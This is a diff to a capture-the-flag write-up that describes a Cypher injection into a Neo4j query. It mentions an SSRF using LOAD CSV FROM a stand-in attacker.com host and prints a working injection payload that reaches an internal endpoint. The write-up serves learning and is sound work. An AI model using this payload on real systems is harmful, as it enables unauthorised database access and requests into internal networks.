@@ -736,7 +736,9 @@ Let's see if we can reach any sink with our input in `search_implant_connections
 We have direct string interpolation into the query via `{search_query}`. During the live event this was my first ever encounter with injection into neo4j commands (which I now know as Cypher injection) so I spent a while frantically googling. I relied heavily on these two resources:
 - [Hacktricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j#common-cypher-injections)
 - [Pentesterland](https://pentester.land/blog/cypher-injection-cheatsheet/#load-csv)
+
 The exact steps I used to arrive at my final query are a blur now but I recall fixing the return syntax was a requirement, as was using an open inline comment to ignore the rest of the broken query. Also wasting a lot of time trying to use apoc before realising it was not installed....  anyway after this I discovered we can achieve an SSRF with  `LOAD CSV FROM 'https://attacker.com/'`. After a lot of fuzzing and tweaking I discovered we can hit internal endpoints using this method with the following query:
+
 ```
 ' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name LOAD CSV FROM 'http://127.0.0.1:1234/' as l RETURN 1 as identifier1,2 as identifier2/*
 ```
